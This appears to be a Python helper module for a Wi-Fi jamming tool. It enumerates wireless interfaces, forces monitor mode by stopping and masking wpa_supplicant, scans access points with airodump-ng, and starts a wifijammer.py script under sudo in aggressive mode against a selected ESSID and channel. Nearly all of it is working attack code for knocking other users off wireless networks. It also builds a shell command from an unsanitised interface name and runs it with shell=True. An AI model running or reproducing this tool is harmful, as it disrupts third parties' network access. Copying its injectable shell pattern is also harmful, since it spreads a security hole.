import re
import subprocess
import os
import signal

#global Vars
proc=None
pidList=[]
logString=""

def getNICnames():
			ifaces = []
			
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('w[a-zA-Z0-9]+:', data):
				ifaces.append(n.rstrip(":"))
			return ifaces


def enableMonitor(iface):
			cmds="ip link set "+iface+" down; systemctl stop wpa_supplicant.service; systemctl mask wpa_supplicant.service; iw dev "+iface+" set type monitor"
			process=subprocess.run(cmds,capture_output=True,shell=True) 
        	

def checkMon(iface):
			global logString
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0].decode()
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				logString+=" monitor mode enabled on "+iface+"\n"
				return True
				
			else:
				logString+=" monitor mode cannot be enabled on "+iface+" please select other interface"+"\n"
				return False 

def scanAps(iface):
			if os.path.exists("../CSV/data-01.csv"):
				os.remove("../CSV/data-01.csv")
			process=subprocess.Popen(['timeout','15','airodump-ng','-w','../CSV/data','--output-format','csv','--write-interval','1',iface],stdout=subprocess.PIPE)
			
			
			

			
		

def filterAps():
			pass

def jamAp(iface,ESSID,channel):
			global logString
			global pidList
			global proc#means using global var
			ESSID=ESSID[1:]# slices first space character
			print("Jamming Ap:"+ESSID+channel)
			logString+=" Jamming Ap: "+ESSID+"; Channel: "+channel+"\n"
			proc=subprocess.Popen(['sudo','python3','../wifijammer/wifijammer.py','--interface',iface,'-c',channel,'-a',ESSID,'-d','0','-p','1','--aggressive'],stdout=subprocess.PIPE,shell=False,preexec_fn=os.setsid)
			pidList.append(proc.pid)
			

def stopJammer():
	global pidList
	global logString
	print(pidList)
	for pid in pidList:
		print("pid killing : "+str(pid))
		logString+=" Stopping Jammer; Terminating Process: "+str(pid)+"\n"
		cmd="sudo kill %s" % pid
		os.killpg(os.getpgid(pid),signal.SIGTERM)
	pidList.clear()
		
		
		


			
			
		
